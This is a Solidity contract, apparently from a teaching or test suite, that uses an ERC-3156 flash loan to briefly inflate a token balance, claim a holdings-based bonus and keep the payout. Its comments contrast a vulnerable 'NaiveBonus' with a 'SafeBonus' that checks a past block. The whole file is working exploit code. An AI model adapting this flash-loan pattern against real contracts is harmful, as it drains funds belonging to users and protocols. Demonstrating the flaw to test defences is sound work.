// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IVotes} from "@openzeppelin/contracts/governance/utils/IVotes.sol";
import {IBonus} from "../bonus/IBonus.sol";

/// @title BonusAttacker — uses a flash loan to look rich for one transaction
/// @notice Borrows HIM, claims a bonus that is paid on "HIM held", repays HIM + fee, keeps the HUSD.
///         Against `NaiveBonus` this drains the pot. Against `SafeBonus` the claim reverts (it looks at
///         a past block), so the whole transaction reverts and the attacker loses only gas.
contract BonusAttacker is IERC3156FlashBorrower {
    using SafeERC20 for IERC20;

    // solhint-disable immutable-vars-naming
    IERC3156FlashLender public immutable lender;
    IERC20 public immutable him;
    IERC20 public immutable husd;
    address public immutable attacker;
    // solhint-enable immutable-vars-naming

    error NotAttacker();
    error UntrustedLender();

    constructor(IERC3156FlashLender lender_, IERC20 him_, IERC20 husd_) {
        lender = lender_;
        him = him_;
        husd = husd_;
        attacker = msg.sender;
    }

    /// @param himFee The attacker sends a little HIM first to pay the flash-loan fee.
    function attack(IBonus bonus, uint256 amount, uint256 himFee) external returns (uint256 stolen) {
        if (msg.sender != attacker) revert NotAttacker();
        him.safeTransferFrom(msg.sender, address(this), himFee);
        // Delegate to ourselves so borrowed HIM would count as "votes" too (it still won't help vs SafeBonus).
        IVotes(address(him)).delegate(address(this));
        lender.flashLoan(this, address(him), amount, abi.encode(bonus));
        stolen = husd.balanceOf(address(this));
        husd.safeTransfer(attacker, stolen);
        uint256 leftHim = him.balanceOf(address(this));
        if (leftHim > 0) him.safeTransfer(attacker, leftHim);
    }

    function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        if (msg.sender != address(lender)) revert UntrustedLender();
        abi.decode(data, (IBonus)).claim(); // "I hold 1,000,000 HIM", for a moment
        him.forceApprove(address(lender), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
